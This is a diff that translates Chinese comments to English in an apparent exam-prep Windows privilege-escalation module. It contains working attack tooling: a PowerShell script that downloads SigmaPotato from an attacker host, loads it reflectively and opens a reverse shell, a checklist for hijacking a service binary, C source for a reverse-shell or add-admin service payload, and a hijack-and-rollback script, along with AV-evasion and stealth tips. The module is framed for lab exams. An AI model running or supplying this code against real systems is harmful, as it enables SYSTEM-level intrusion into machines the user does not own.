+Placeholders: LHOST=attacker IP; LPORT=listener port; URL=http://LHOST/SigmaPotato.exe (your delivery URL)
+Test status: Not run on Windows (host is macOS); syntax checked by hand. If AMSI/AV blocks, handle AMSI first (see docs/05)
 #>
 [CmdletBinding()]
 param(
-    [string]$Url = "http://LHOST/SigmaPotato.exe",   # 攻击机 python3 -m http.server 提供
-    [string]$LocalPath = "",                          # 已落盘的 SigmaPotato.exe 路径（二选一）
-    [string]$Command = "cmd /c whoami",               # 普通命令模式
-    [string]$RevShellIP = "",                         # 反向 shell 模式（与 -Command 二选一）
+    [string]$Url = "http://LHOST/SigmaPotato.exe",   # attacker: python3 -m http.server
+    [string]$LocalPath = "",                          # already-on-disk SigmaPotato.exe (choose one)
+    [string]$Command = "cmd /c whoami",               # plain command mode
+    [string]$RevShellIP = "",                         # reverse-shell mode (mutually exclusive with -Command)
     [int]$RevShellPort = 0,
-    [switch]$CheckOnly                                # 只检查特权不执行
+    [switch]$CheckOnly                                # only check privileges, do not execute
 )
 
 function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }
 
-Section "特权检查（失败先看这里）"
+Section "Privilege check (look here first on failure)"
 $privOut = whoami /priv
 $privOut | Write-Output
 $hasImp = ($privOut | Select-String "SeImpersonatePrivilege") -ne $null
 $enabled = $hasImp -and (($privOut | Select-String "SeImpersonatePrivilege") -match "Enabled")
 if (-not $hasImp) {
-    Write-Output "[-] 没有 SeImpersonatePrivilege —— 土豆类技术不适用，改走服务劫持（docs/06 场景 27）"
+    Write-Output "[-] No SeImpersonatePrivilege — potato techniques do not apply; switch to service hijack (docs/06 scenario 27)"
     exit 1
 }
 if (-not $enabled) {
-    Write-Output "[!] SeImpersonatePrivilege 存在但被 DISABLED（服务账户令牌常见）"
-    Write-Output "[!] 先用 FullPowers 恢复默认特权集，再重跑本脚本："
-    Write-Output "    FullPowers.exe -c \"powershell -ep bypass -f m06-sigmapotato-reflect.ps1 -Url $Url -RevShellIP $RevShellIP -RevShellPort $RevShellPort\""
+    Write-Output "[!] SeImpersonatePrivilege present but DISABLED (common on service-account tokens)"
+    Write-Output "[!] Restore the default privilege set with FullPowers, then re-run this script:"
+    Write-Output "    FullPowers.exe -c `"powershell -ep bypass -f m06-sigmapotato-reflect.ps1 -Url $Url -RevShellIP $RevShellIP -RevShellPort $RevShellPort`""
     exit 1
 }
-Write-Output "[+] SeImpersonatePrivilege 已启用，继续"
+Write-Output "[+] SeImpersonatePrivilege enabled — continuing"
 
-if ($CheckOnly) { Write-Output "[CheckOnly] 特权就绪。真正执行时去掉 -CheckOnly"; exit 0 }
+if ($CheckOnly) { Write-Output "[CheckOnly] privileges ready. Drop -CheckOnly for real execution"; exit 0 }
 
-Section "加载 SigmaPotato 程序集"
+Section "Load SigmaPotato assembly"
 $bytes = $null
 if ($LocalPath) {
-    if (-not (Test-Path $LocalPath)) { Write-Output "[-] $LocalPath 不存在"; exit 1 }
-    Write-Output "[+] 从本地文件读取：$LocalPath"
+    if (-not (Test-Path $LocalPath)) { Write-Output "[-] $LocalPath missing"; exit 1 }
+    Write-Output "[+] reading local file: $LocalPath"
     $bytes = [IO.File]::ReadAllBytes($LocalPath)
 } else {
-    Write-Output "[+] 下载：$Url"
+    Write-Output "[+] downloading: $Url"
     try {
         $wc = New-Object System.Net.WebClient
-        # 若目标走代理才需要下一行；默认直连
+        # Uncomment next line only if the target must use a proxy; default is direct
         $bytes = $wc.DownloadData($Url)
     } catch {
-        Write-Output "[-] 下载失败：$($_.Exception.Message)"
-        Write-Output "[-] 备选：A) 本机已有文件用 -LocalPath  B) certutil -urlcache -split -f $Url  C) 换 http 端口/UA"
+        Write-Output "[-] download failed: $($_.Exception.Message)"
+        Write-Output "[-] fallbacks: A) local file via -LocalPath  B) certutil -urlcache -split -f $Url  C) change http port/UA"
         exit 1
     }
 }
 $asm = [System.Reflection.Assembly]::Load($bytes)
-if (-not $asm) { Write-Output "[-] Assembly::Load 返回空（文件不是有效 .NET 程序集？）"; exit 1 }
+if (-not $asm) { Write-Output "[-] Assembly::Load returned null (file not a valid .NET assembly?)"; exit 1 }
 $type = $asm.GetType("SigmaPotato")
 if (-not $type) {
-    Write-Output "[-] 找不到 SigmaPotato 类型（版本不符？用 [SigmaPotato]::Main 失败时查看程序集导出类型："
+    Write-Output "[-] SigmaPotato type not found (version mismatch? when [SigmaPotato]::Main fails, list exported types:"
     Write-Output "    $($asm.GetExportedTypes() | ForEach-Object { $_.FullName })"
     exit 1
 }
 
-Section "执行"
+Section "Execute"
 try {
     if ($RevShellIP -and $RevShellPort) {
-        Write-Output "[+] 反向 shell 模式：$RevShellIP : $RevShellPort"
+        Write-Output "[+] reverse-shell mode: $RevShellIP : $RevShellPort"
         $type::Main(@("--revshell", $RevShellIP, "$RevShellPort"))
     } else {
-        Write-Output "[+] 命令模式：$Command"
+        Write-Output "[+] command mode: $Command"
         $type::Main($Command)
     }
-    Write-Output "[*] Main 返回（或已在子进程里反弹）。验证：whoami 应为 nt authority\system"
+    Write-Output "[*] Main returned (or reverse already spawned in a child). Verify: whoami should be nt authority\system"
 } catch {
-    Write-Output "[-] 执行异常：$($_.Exception.Message)"
-    Write-Output "[-] 失败排查：A) 目标版本过老（Win7/2008）→ PrintSpoofer/SigmaPotato 需 Win10/2016+，换 JuicyPotato/RoguePotato"
-    Write-Output "[-]           B) 命令含特殊字符被拆分 → 加引号或先落地 cmd 脚本再执行"
-    Write-Output "[-]           C) 杀软拦反射加载 → 先做 AMSI/内存处理（docs/05）或落地执行"
+    Write-Output "[-] execution exception: $($_.Exception.Message)"
+    Write-Output "[-] failure triage: A) target too old (Win7/2008) → PrintSpoofer/SigmaPotato need Win10/2016+; switch JuicyPotato/RoguePotato"
+    Write-Output "[-]               B) special chars in command got split → quote or land a cmd script first"
+    Write-Output "[-]               C) AV blocks reflective load → AMSI/memory handling first (docs/05) or land and run"
     exit 1
 }
 ````
 
-## Scenario 27 · 手工服务二进制劫持（含回滚）
+## Scenario 27 · Manual service binary hijack (with rollback)
 
-### Scenario回顾
-拿到低权限立足点后，`sc qc` / `wmic service` 发现某个 Windows 服务：**二进制路径指向可写位置**，或**注册表 ImagePath 可改**，且服务可被（重新）启动/停止。目标：把服务二进制换成自己的 payload，等服务以 SYSTEM 启动 → 提权。
+### Situation
+After a low-priv foothold, `sc qc` / `wmic service` shows a Windows service whose **binary path points to a writable location**, or whose **registry ImagePath is writable**, and the service can be (re)started/stopped. Goal: replace the service binary with your payload, wait for SYSTEM start → elevate.
 
-### 前提与假设
-- 服务以 `LocalSystem`（或高权限账户）运行；
-- 二进制所在目录对当前用户**可写**，或服务配置（`HKLM\SYSTEM\CurrentControlSet\Services\<svc>`）的 `ImagePath` 可写/可改；
-- 服务允许低权限用户 `start/stop`（`sc start` 不报拒绝访问），或依赖重启/崩溃自动拉起（考试环境多可直接重启服务）；
-- 已确认原服务不影响考试目标继续运行（破坏性最小原则，见回滚）。
+### Assumptions
+- Service runs as `LocalSystem` (or another high-rights account);
+- Binary directory is **writable** by the current user, or service config (`HKLM\SYSTEM\CurrentControlSet\Services\<svc>`) `ImagePath` is writable/changeable;
+- Low-priv user can `start/stop` (`sc start` is not access-denied), or the service auto-restarts on reboot/crash (exam labs often allow direct service restart);
+- You confirmed the original service is not required for continued exam progress (minimize damage — see rollback).
 
-### 准备（attacker box侧）
+### Prepare (attacker)
 ```bash
-# 用 m06-service-binary-payload.c 编译 payload：
-#   x86_64-w64-mingw32-gcc -o svcpayload.exe m06-service-binary-payload.c   (Linux 交叉编译)
-#   或 VS: cl m06-service-binary-payload.c
-# 确认服务架构：服务名是 32 位进程就编 x86，64 位就编 x64。
+# Build payload with m06-service-binary-payload.c:
+#   x86_64-w64-mingw32-gcc -o svcpayload.exe m06-service-binary-payload.c   (Linux cross-compile)
+#   or VS: cl m06-service-binary-payload.c
+# Match service arch: 32-bit service process → build x86; 64-bit → x64.
 ```
 
-### 执行步骤（checklist）
+### Procedure (checklist)
 ```powershell
-# 1) 枚举可写服务（三种视角）：
+# 1) Enumerate writable services (three angles):
 wmic service get name,pathname,startname | findstr /i "LocalSystem"
-sc qc <svc>                          # 确认 StartType、BINARY_PATH_NAME、SERVICE_START_NAME
-# 用 accesschk（Sysinternals）查可写：
-accesschk.exe /accepteula -uwcqv "Authenticated Users" *     # 全校验过于吵，按需过滤
+sc qc <svc>                          # StartType, BINARY_PATH_NAME, SERVICE_START_NAME
+# Writable check with accesschk (Sysinternals):
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *     # full check is noisy — filter as needed
 accesschk.exe /accepteula -uwcqv USER * | findstr /i "service"
 
-# 2) 记录原配置（回滚必须！）：
+# 2) Record original config (required for rollback!):
 reg export "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" C:\Windows\Temp\<svc>-backup.reg /y
-# 或记下：ImagePath、ObjectName、Start、ImagePath 环境变量展开方式
+# or note: ImagePath, ObjectName, Start, how ImagePath expands env vars
 
-# 3) 落地替换：
-#    方式 A：目录可写 → 备份原 exe、放 payload
+# 3) Land and replace:
+#    Method A: directory writable → back up original exe, drop payload
 copy /y "C:\Program Files\<vendor>\<svc>.exe" C:\Windows\Temp\<svc>.exe.bak
 copy /y C:\Windows\Temp\svcpayload.exe "C:\Program Files\<vendor>\<svc>.exe"
-#    方式 B：目录不可写但 ImagePath 可改（低版本/配置错误）→ 指向attacker box可控路径的 payload
+#    Method B: directory not writable but ImagePath is (older/misconfigured) → point to attacker-controlled payload path
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\svcpayload.exe" /f
-#    方式 C（备选）：DLL 劫持——把恶意 DLL 放进服务目录并让其优先于原 DLL 加载（依赖已知缺失 DLL 时）
+#    Method C (fallback): DLL hijack — drop a malicious DLL into the service dir so it loads before the original (depends on a known missing DLL)
 
-# 4) 触发：
+# 4) Trigger:
 sc stop <svc> ; sc start <svc>
-# 服务不可手动停 → 尝试 net stop / 重启机器（考试环境慎用）/ schtasks 定时触发
-# 某些服务一次启动后崩溃会反复拉起——正好用于拿 shell
+# If not manually stoppable → try net stop / reboot (exam: use carefully) / schtasks timed trigger
+# Some services crash-loop after one start — that can be useful for getting a shell
 
-# 5) 确认 SYSTEM shell 回连后立刻回滚：
+# 5) After SYSTEM shell callbacks, roll back immediately:
 sc stop <svc>
 copy /y C:\Windows\Temp\<svc>.exe.bak "C:\Program Files\<vendor>\<svc>.exe"
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /f   # 若方式 B
-reg import C:\Windows\Temp\<svc>-backup.reg /y   # 若方式 A 且改过注册表
-sc start <svc>                                   # 恢复原服务（Verify能起）
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /f   # if method B
+reg import C:\Windows\Temp\<svc>-backup.reg /y   # if method A and registry was changed
+sc start <svc>                                   # restore original service (confirm it starts)
 ```
 
-### 用到的脚本
-- `m06-service-binary-payload.c`（服务 payload：启动后派生反连 shell 或加管理员，且可选地替身保持服务“活着”）
-- `m06-service-hijack.ps1`（保存/恢复原配置的完整劫持+回滚自动化）
+### Lab files
+- `m06-service-binary-payload.c` (service payload: on start, spawn reverse shell or add admin; optionally stay alive so the service “looks alive”)
+- `m06-service-hijack.ps1` (full hijack + rollback automation that saves/restores original config)
 
 ### Verify
-- 触发后attacker box监听收到 SYSTEM shell（`whoami` → `nt authority\system`）；
-- 回滚后 `sc start <svc>` 成功、原进程正常。
+- After trigger, attacker listener receives a SYSTEM shell (`whoami` → `nt authority\system`);
+- After rollback, `sc start <svc>` succeeds and the original process is healthy.
 
-### 失败分支与备选
-1. **`sc start` 报“拒绝访问”**：低权限用户通常只能启动部分服务——换一个可启动的服务（优先第三方软件服务、`Auto` 启动、无 `ChangeConfig` 保护）；或改用**计划任务/启动项**（如果该用户可写 `HKLM\...\Run` 或 Startup 目录，但那只在下次登录/重启生效）。
-2. **替换后服务起不来**：payload 没实现服务主函数或 `SERVICE_START` 失败——`m06-service-binary-payload.c` 不把自己注册成服务而是 fork 出反连（即服务启动瞬间报错但子进程已出网）；此时 `sc start` 会报错但 shell 已回来，属预期。若想服务“正常”运行（更隐蔽），编译成带最小服务主循环的版本。
-3. **目录可写但替换被占用/被 AV 拦**：先停服务再替换；AV 拦截就换无文件方案（服务 ImagePath 指向 `rundll32`/`regsvr32` 起脚本阶段？——不行，ImagePath 是 EXE；可用 `powershell.exe -enc` 作为 ImagePath 指向本机已有二进制）。
-4. **找不到可写服务**：扩大枚举（`icacls` 手工查第三方安装目录），或评估自装服务（若可 `sc create` 则自建一个指向自己 payload 的服务——需要 SeServiceLogonRight 之类，常见于运维弱配置）；都不行再考虑场景 25/26。
-5. 回滚失败导致目标服务永久损坏：**先导出注册表、备份原 exe 再动手**是硬要求；若回滚后服务仍无法启动，用 `reg import` 恢复并重启服务（见 m06-service-hijack.ps1 的 restore 分支）。
+### If it fails
+1. **`sc start` reports “Access is denied”**: low-priv users can usually only start some services — pick a startable one (prefer third-party software services, `Auto` start, no `ChangeConfig` protection); or use **scheduled task / Run key** (if the user can write `HKLM\...\Run` or Startup — only takes effect on next logon/reboot).
+2. **Service fails to start after replace**: payload did not implement a service main / `SERVICE_START` fails — `m06-service-binary-payload.c` does not register with SCM; it forks a reverse connect (service start may error while the child already egressed); `sc start` erroring while the shell is back is expected. For a “healthy” service (quieter), build a version with a minimal service main loop.
+3. **Directory writable but replace is locked / AV blocks**: stop the service first, then replace; if AV blocks, switch to fileless (ImagePath pointing at `rundll32`/`regsvr32` for a script stage? — no, ImagePath must be an EXE; you can set ImagePath to `powershell.exe -enc` using a binary already on the host).
+4. **No writable service found**: widen enum (`icacls` on third-party install dirs), or evaluate creating your own service (if `sc create` is allowed, point it at your payload — needs rights like SeServiceLogonRight; common in weak ops configs); if none work, revisit scenarios 25/26.
+5. Rollback fails and the target service stays broken: **export registry and back up the original exe before touching anything** is a hard requirement; if it still will not start after rollback, `reg import` and restart (see `m06-service-hijack.ps1` restore branch).
 
-### 考试注意 OPSEC
-- **回滚是评分点**：考纲环境常要求最后恢复原状，别把考试服务搞挂（许多场景依赖同一服务后续继续用）。
-- 替换系统自带服务（如 `Spooler`）动静太大、易被发现；优先找第三方/教学环境预设的脆弱服务。
-- payload 名称尽量贴近原服务名（如 `svc.exe`），落地在 `%TEMP%` 或用后即删，避免持久化痕迹。
-- 计划任务/重启触发方式在考试里要谨慎评估对环境的破坏（重启可能断掉你的其他通道）。
+### Exam notes / OPSEC
+- **Rollback is a scoring point**: exam environments often require restoring original state; do not break a service the later stages still need.
+- Replacing built-in services (e.g. `Spooler`) is loud and easy to spot; prefer third-party / lab-planted weak services.
+- Name the payload close to the original service (e.g. `svc.exe`), land under `%TEMP%` or delete after use to avoid persistence artifacts.
+- Scheduled-task / reboot triggers need careful assessment of collateral damage in the exam (reboot may kill your other channels).
 
 ---
 
@@ -426,43 +422,43 @@ sc start <svc>                                   # 恢复原服务（Verify能�
 
 ````c
 /*
-用途：Windows 服务二进制劫持用的 payload——服务以 SYSTEM 启动时执行，默认反向 shell（cmd 直连回攻击机），或编译成添加本地管理员两种模式
-场景：docs/06-uac-windows-privesc.md 场景 27（低权限可替换/可改高权限服务二进制 → SYSTEM）；替换后由 sc start 触发
-依赖：Windows（winsock2）；编译时需 -lws2_32（仅反向 shell 模式需要）
-使用：Linux 交叉编译（位数必须匹配服务进程：先确认服务是 x86 还是 x64）：
-      # 反向 shell（默认模式）
+Purpose: Payload for Windows service binary hijack — runs when the service starts as SYSTEM; default reverse shell (cmd straight back to attacker), or compile-time add-local-admin mode
+Scenario: docs/06-uac-windows-privesc.md scenario 27 (low priv can replace/change a high-rights service binary → SYSTEM); triggered by sc start after replace
+Depends: Windows (winsock2); compile with -lws2_32 (reverse-shell mode only)
+Usage: Linux cross-compile (bitness must match the service process — confirm x86 vs x64 first):
+      # reverse shell (default mode)
       x86_64-w64-mingw32-gcc m06-service-binary-payload.c -o svcpayload.exe -lws2_32
         -DLHOST=\"10.10.14.5\" -DLPORT=4444
-      # 添加本地管理员（无回连需求时，例如目标出网受限）
+      # add local admin (no callback needed — e.g. target egress constrained)
       x86_64-w64-mingw32-gcc m06-service-binary-payload.c -o svcpayload.exe -DMODE_ADDUSER \
         -DUSER=ops -DPASS=\"P@ssw0rd!2024\"
-      # 保持进程存活（进程不退出，服务重启循环更稳；配合无 SCM 注册的行为）
+      # keep process alive (do not exit — more stable with restart loops; pairs with non-SCM-registered behavior)
       ... -DSERVICE_STAYALIVE
-      # 32 位服务用：i686-w64-mingw32-gcc（同上参数）
-占位符：LHOST=攻击机可达 IP；LPORT=监听端口；USER/PASS=要添加的管理员账户（默认 emma / Password123!）
-测试状态：未实测（本机 macOS 无 mingw 交叉链）；语法经人工检查。上靶机前先在隔离 VM 用 sc create 自建服务验证
-注意：被 SCM 启动时本程序不注册为服务控制分发器，sc start 可能报 1053——shell/账户副作用已发生即视为成功，随后按 docs/06 回滚
+      # 32-bit services: i686-w64-mingw32-gcc (same args)
+Placeholders: LHOST=attacker-reachable IP; LPORT=listener port; USER/PASS=admin account to add (defaults emma / Password123!)
+Test status: Not runtime-tested (host macOS, no mingw cross chain); syntax checked by hand. Before the lab, validate once in an isolated VM with sc create
+Note: when started by SCM this program does not register a service control dispatcher — sc start may report 1053. Treat shell/account side effects as success, then roll back per docs/06
 */
 #define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
 
-/* ---------- 配置（编译期 -D 覆盖） ---------- */
+/* ---------- Config (override at compile with -D) ---------- */
 #ifndef LHOST
-#define LHOST "127.0.0.1"          /* 攻击机 IP */
+#define LHOST "127.0.0.1"          /* attacker IP */
 #endif
 #ifndef LPORT
-#define LPORT 4444                 /* 攻击机监听端口 */
+#define LPORT 4444                 /* attacker listener port */
 #endif
 #ifndef USER
-#define USER "emma"                /* ADDUSER 模式账户名 */
+#define USER "emma"                /* ADDUSER mode account name */
 #endif
 #ifndef PASS
-#define PASS "Password123!"        /* ADDUSER 模式密码（须满足目标密码策略） */
+#define PASS "Password123!"        /* ADDUSER mode password (must meet target policy) */
 #endif
 
-/* ---------- 模式一：反向 shell（默认） ---------- */
+/* ---------- Mode 1: reverse shell (default) ---------- */
 static int revshell(void)
 {
     WSADATA wsa;
@@ -480,14 +476,14 @@ static int revshell(void)
     addr.sin_family = AF_INET;
     addr.sin_port = htons((unsigned short)LPORT);
     addr.sin_addr.s_addr = inet_addr(LHOST);
-    /* 不解析主机名：LHOST 直接给 IP，避免服务上下文 DNS 依赖 */
+    /* no hostname resolve: give LHOST as an IP to avoid DNS dependency in service context */
     if (WSAConnect(s, (struct sockaddr *)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
         closesocket(s);
         WSACleanup();
         return 1;
     }
 
-    /* 把 socket 当标准句柄交给 cmd.exe，得到交互 shell */
+    /* hand the socket to cmd.exe as std handles for an interactive shell */
     memset(&si, 0, sizeof(si));
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
@@ -497,13 +493,13 @@ static int revshell(void)
         WSACleanup();
         return 1;
     }
-    /* 子进程继承 socket，父进程句柄可立即关闭 */
+    /* child inherits the socket; parent handles can close immediately */
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     return 0;
 }
 
-/* ---------- 模式二：添加本地管理员（-DMODE_ADDUSER） ---------- */
+/* ---------- Mode 2: add local admin (-DMODE_ADDUSER) ---------- */
 static int addadmin(void)
 {
     char buf[256];
@@ -522,7 +518,7 @@ int main(void)
     revshell();
 #endif
 #ifdef SERVICE_STAYALIVE
-    /* 服务重启循环场景：让进程活着，避免 SCM 反复拉起造成日志噪音 */
+    /* service restart-loop scenarios: stay alive to avoid SCM restart noise */
     Sleep(INFINITE);
 #endif
     return 0;
@@ -533,23 +529,23 @@ int main(void)
 
 ````powershell
 <#
-用途：手工服务二进制劫持的完整自动化——先保存原配置（注册表导出 + 原 exe 备份），替换为 payload 并启动服务，之后再一键回滚恢复原状
-场景：docs/06-uac-windows-privesc.md 场景 27（自动服务提权工具失败，但你确认能改某高权限服务的二进制或 ImagePath）
-依赖：PowerShell 3.0+（Get-CimInstance）；当前用户对该服务有 start/stop/改配置权限；payload 已上传到目标（如 C:\Windows\Temp\svcpayload.exe）
-使用：先劫持：
-      powershell -ep bypass -f m06-service-hijack.ps1 -ServiceName <svc> -PayloadPath C:\Windows\Temp\svcpayload.exe
-      # 验证拿到 SYSTEM（whoami）后回滚：
-      powershell -ep bypass -f m06-service-hijack.ps1 -Action Restore -ServiceName <svc>
-      # 目标目录不可写但 ImagePath 可改时，劫持加 -UseImagePath（ImagePath 指向 payload）
-占位符：TARGET=目标主机；payload 里 LHOST/LPORT 已编好；USER/PASS 模式见 m06-service-binary-payload.c
-测试状态：未在 Windows 实测（本机为 macOS）；语法经人工检查。回滚逻辑务必先在隔离 VM 验证一次
+Purpose: Full automation for manual service binary hijack — save original config (registry export + original exe backup), replace with payload and start the service, then one-shot rollback to restore
+Scenario: docs/06-uac-windows-privesc.md scenario 27 (auto service priv-esc tools failed, but you confirmed you can change a high-rights service binary or ImagePath)
+Depends: PowerShell 3.0+ (Get-CimInstance); current user can start/stop/change that service; payload already uploaded (e.g. C:\Windows\Temp\svcpayload.exe)
+Usage: hijack first:
+       powershell -ep bypass -f m06-service-hijack.ps1 -ServiceName <svc> -PayloadPath C:\Windows\Temp\svcpayload.exe
+       # after SYSTEM (whoami) confirmed, roll back:
+       powershell -ep bypass -f m06-service-hijack.ps1 -Action Restore -ServiceName <svc>
+       # when directory is not writable but ImagePath is, add -UseImagePath (ImagePath points at payload)
+Placeholders: TARGET=target host; LHOST/LPORT already baked into the payload; USER/PASS mode — see m06-service-binary-payload.c
+Test status: Not run on Windows (host is macOS); syntax checked by hand. Validate rollback logic once in an isolated VM
 #>
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true)][ValidateSet("Hijack", "Restore")][string]$Action = "Hijack",
     [Parameter(Mandatory = $true)][string]$ServiceName,
     [string]$PayloadPath = "C:\Windows\Temp\svcpayload.exe",
-    [switch]$UseImagePath,            # 目录不可写时改注册表 ImagePath 指向 payload
+    [switch]$UseImagePath,            # when directory not writable, change registry ImagePath to payload
     [int]$WaitSeconds = 8
 )
 
@@ -561,83 +557,83 @@ function Get-Svc {
     Get-CimInstance Win32_Service -Filter "Name='$ServiceName'" -ErrorAction Stop
 }
 function Split-BinPath([string]$p) {
-    # PathName 可能是 "C:\Program Files\X\svc.exe" --arg；解析出纯 exe 路径
+    # PathName may be "C:\Program Files\X\svc.exe" --arg; extract bare exe path
     $p = $p.Trim()
     if ($p.StartsWith('"')) { return ($p -split '"')[1] }
     return ($p -split '\s+')[0]
 }
 
-if (-not (Get-Svc)) { Write-Log "[-] 服务 $ServiceName 不存在（服务名区分大小写，sc qc 核对）"; exit 1 }
+if (-not (Get-Svc)) { Write-Log "[-] service $ServiceName missing (names are case-sensitive — confirm with sc qc)"; exit 1 }
 
-# ================= 回滚 =================
+# ================= Restore =================
 if ($Action -eq "Restore") {
-    if (-not (Test-Path $StateFile)) { Write-Log "[-] 找不到状态文件 $StateFile —— 无备份可恢复，人工用当时导出的 .reg/备份 exe 恢复"; exit 1 }
+    if (-not (Test-Path $StateFile)) { Write-Log "[-] state file $StateFile missing — no backup to restore; recover manually from the .reg / backup exe you exported then"; exit 1 }
     $s = Get-Content $StateFile | Out-String | ConvertFrom-StringData
-    Write-Log "[+] 停止服务并恢复原二进制 $($s.OriginalPath)"
-    try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[!] 停止失败：$($_.Exception.Message)（继续尝试复制）" }
+    Write-Log "[+] stopping service and restoring original binary $($s.OriginalPath)"
+    try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[!] stop failed: $($_.Exception.Message) (continuing copy attempt)" }
     Start-Sleep -Seconds 1
     try {
         if ($s.BackupPath -and (Test-Path $s.BackupPath)) {
             Copy-Item -Path $s.BackupPath -Destination $s.OriginalPath -Force
-            Write-Log "[+] 原 exe 已复制回 $($s.OriginalPath)"
+            Write-Log "[+] original exe copied back to $($s.OriginalPath)"
         }
         if ($s.RegBackup -and (Test-Path $s.RegBackup)) {
             reg import $s.RegBackup | Out-Null
-            Write-Log "[+] 注册表已从 $($s.RegBackup) 恢复"
+            Write-Log "[+] registry restored from $($s.RegBackup)"
         }
         Remove-Item $StateFile -Force
-    } catch { Write-Log "[-] 回滚失败：$($_.Exception.Message)"; exit 1 }
-    try { Start-Service -Name $ServiceName -ErrorAction Stop; Write-Log "[+] 服务已按原配置重新启动（验证：sc query $ServiceName 应为 RUNNING）" }
-    catch { Write-Log "[!] 服务未能启动：$($_.Exception.Message)（检查 .reg 是否含 Startup 密码等）" }
+    } catch { Write-Log "[-] rollback failed: $($_.Exception.Message)"; exit 1 }
+    try { Start-Service -Name $ServiceName -ErrorAction Stop; Write-Log "[+] service restarted with original config (verify: sc query $ServiceName should be RUNNING)" }
+    catch { Write-Log "[!] service failed to start: $($_.Exception.Message) (check whether .reg includes Startup password etc.)" }
     exit 0
 }
 
-# ================= 劫持 =================
+# ================= Hijack =================
 $svc  = Get-Svc
 $bin  = Split-BinPath $svc.PathName
-Write-Log "[+] 服务: $($svc.Name) | 原二进制: $bin | 运行账户: $($svc.StartName)"
-if (-not (Test-Path $bin)) { Write-Log "[-] 原二进制不存在 $bin（路径含变量？先人工确认）"; exit 1 }
-if (-not (Test-Path $PayloadPath)) { Write-Log "[-] payload 不存在 $PayloadPath，先上传"; exit 1 }
+Write-Log "[+] service: $($svc.Name) | original binary: $bin | run-as: $($svc.StartName)"
+if (-not (Test-Path $bin)) { Write-Log "[-] original binary missing $bin (path has variables? confirm manually)"; exit 1 }
+if (-not (Test-Path $PayloadPath)) { Write-Log "[-] payload missing $PayloadPath — upload first"; exit 1 }
 
 $stamp = Get-Date -Format "yyyyMMdd-HHmmss"
 $regBackup = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".reg")
 $backupExe = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".exe")
 
-Write-Log "[+] 保存原配置：reg export + 原 exe 备份"
+Write-Log "[+] saving original config: reg export + original exe backup"
 reg export ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) $regBackup /y | Out-Null
 Copy-Item -Path $bin -Destination $backupExe -Force
 @("OriginalPath=$bin", "BackupPath=$backupExe", "RegBackup=$regBackup") | Set-Content -Path $StateFile -Encoding Ascii
-Write-Log "[+] 备份: exe→$backupExe ; reg→$regBackup"
+Write-Log "[+] backup: exe→$backupExe ; reg→$regBackup"
 
-Write-Log "[+] 停止服务"
-try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[-] 无法停止服务：$($_.Exception.Message)（换可停服务，或依赖重启/定时触发）"; exit 1 }
+Write-Log "[+] stopping service"
+try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[-] cannot stop service: $($_.Exception.Message) (pick a stoppable service, or rely on reboot/timed trigger)"; exit 1 }
 
 try {
     if ($UseImagePath) {
-        Write-Log "[+] 改 ImagePath → $PayloadPath（目录不可写备选）"
+        Write-Log "[+] changing ImagePath → $PayloadPath (directory-not-writable fallback)"
         reg add ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) /v ImagePath /t REG_EXPAND_SZ /d $PayloadPath /f | Out-Null
     } else {
-        Write-Log "[+] 替换二进制：$bin ← $PayloadPath"
+        Write-Log "[+] replacing binary: $bin ← $PayloadPath"
         Copy-Item -Path $PayloadPath -Destination $bin -Force
     }
-    Write-Log "[+] 启动服务（触发 payload）"
+    Write-Log "[+] starting service (trigger payload)"
     Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
     Start-Sleep -Seconds $WaitSeconds
 } catch {
-    Write-Log "[!] 触发阶段异常：$($_.Exception.Message)（shell 可能已回连，属预期；sc start 报 1053 时 payload 副作用已发生）"
+    Write-Log "[!] trigger-stage exception: $($_.Exception.Message) (shell may already have called back — expected; when sc start reports 1053, payload side effects already happened)"
 }
 
-Write-Log "[*] 验证：攻击机监听应收到 SYSTEM shell（whoami → nt authority\system）"
-Write-Log "[*] 拿到 shell 后务必回滚：-Action Restore -ServiceName $ServiceName"
-Write-Log "[*] 若回滚时 exe 被占用（payload 进程还活着）：taskkill /F /IM <payload名> 后重跑 Restore"
+Write-Log "[*] verify: attacker listener should have a SYSTEM shell (whoami → nt authority\system)"
+Write-Log "[*] after shell: roll back with -Action Restore -ServiceName $ServiceName"
+Write-Log "[*] if Restore finds exe locked (payload process still alive): taskkill /F /IM <payload-name> then re-run Restore"
 ````
 
-## 附：本模块速查
+## Appendix: module quick lookup
 
-| 判定 | 适用技术 | 脚本/工具 |
+| Condition | Technique | Script/tool |
 |---|---|---|
-| 管理员组成员 + 中完整性 | Fodhelper / ComputerDefaults / AlwaysInstallElevated | `m06-fodhelper-uac.ps1` |
-| SeImpersonate + 服务上下文 | PrintSpoofer → SigmaPotato（出网受限时）→ 老系统 JuicyPotato | `m06-sigmapotato-reflect.ps1` |
-| 可写服务二进制/ImagePath | 服务二进制劫持 + 注册表备份回滚 | `m06-service-binary-payload.c` + `m06-service-hijack.ps1` |
+| Administrators member + medium integrity | Fodhelper / ComputerDefaults / AlwaysInstallElevated | `m06-fodhelper-uac.ps1` |
+| SeImpersonate + service context | PrintSpoofer → SigmaPotato (when egress constrained) → older JuicyPotato | `m06-sigmapotato-reflect.ps1` |
